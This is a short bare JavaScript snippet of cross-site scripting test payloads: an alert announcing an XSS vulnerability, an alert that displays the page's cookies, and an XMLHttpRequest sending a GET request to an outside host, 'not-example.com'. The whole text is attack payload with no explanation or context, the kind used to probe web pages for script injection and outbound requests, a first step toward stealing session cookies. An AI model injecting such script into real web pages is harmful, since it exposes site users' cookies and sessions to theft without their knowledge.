alert("XSS Vulnerability");
alert(document.cookie);
var xhr = new XMLHttpRequest(); 
  xhr.open('GET', 'https://not-example.com/'); 
  xhr.send();
